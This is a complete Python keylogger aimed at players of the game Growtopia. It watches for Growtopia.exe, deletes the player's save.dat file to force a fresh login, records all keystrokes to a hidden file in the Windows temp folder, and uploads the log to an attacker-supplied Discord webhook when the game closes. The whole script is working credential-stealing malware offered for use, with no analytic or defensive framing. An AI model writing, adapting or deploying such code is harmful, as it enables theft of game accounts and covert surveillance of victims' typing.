webhook_url = "https://discord.com/api/webhooks/"

# Dont touch anything below

import os
import time
import subprocess
import sys
import uuid
import psutil
import requests
from pynput import keyboard

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import psutil
    from pynput import keyboard
except ImportError:
    install('psutil')
    install('pynput')
    import psutil
    from pynput import keyboard

temp_path = r"C:\Windows\Temp"
log_file = os.path.join(temp_path, f"{uuid.uuid4()}.tmp")
buffer = ""
last_type_time = time.time()
newline_delay = 2
was_growtopia_running = False
save_dat_file_path = rf"C:\Users\{os.getenv('USERNAME')}\AppData\Local\Growtopia\save.dat"

def delete_save_file(file_path):
    if os.path.isfile(file_path):
        try:
            os.remove(file_path)
            print(f"Successfully deleted: {file_path}")
        except Exception as e:
            print(f"Error deleting file: {e}")
    else:
        print(f"File not found: {file_path}")

def is_growtopia_running():
    for process in psutil.process_iter(['name']):
        try:
            if process.info['name'] == "Growtopia.exe":
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def write_buffer():
    global buffer
    if buffer:
        with open(log_file, "a") as f:
            f.write(buffer + "\n")
        print("Buffer written to file.")
        buffer = ""

def create_empty_log_file():
    if not os.path.isfile(log_file):
        open(log_file, 'w').close()
        print("Created empty log file.")

def send_to_discord():
    create_empty_log_file()
    with open(log_file, 'rb') as f:
        files = {'file': (os.path.basename(log_file), f)}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print("File sent to Discord successfully.")
        else:
            print(f"Failed to send file to Discord. Status code: {response.status_code}")

def on_press(key):
    global buffer, last_type_time
    last_type_time = time.time()

    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        else:
            buffer += f"[{key.name}]"

def on_release(key):
    pass

def main():
    global was_growtopia_running
    listener = None

    print("Monitoring for Growtopia...")
    
    while True:
        if is_growtopia_running():
            if not was_growtopia_running:
                print("Growtopia is currently running. Deleting save.dat...")
                delete_save_file(save_dat_file_path)
                print("Starting keylogger...")
                was_growtopia_running = True
            
            if listener is None or not listener.running:
                listener = keyboard.Listener(on_press=on_press, on_release=on_release)
                listener.start()

            while was_growtopia_running:
                time.sleep(0)
                if time.time() - last_type_time > newline_delay and buffer:
                    write_buffer()
                
                if not is_growtopia_running():
                    print("Growtopia has closed.")
                    was_growtopia_running = False
                    write_buffer()
                    listener.stop()
                    send_to_discord()
                    break
        else:
            if was_growtopia_running:
                print("Growtopia is not running, checking again...")
            time.sleep(0)

if __name__ == "__main__":
    main()
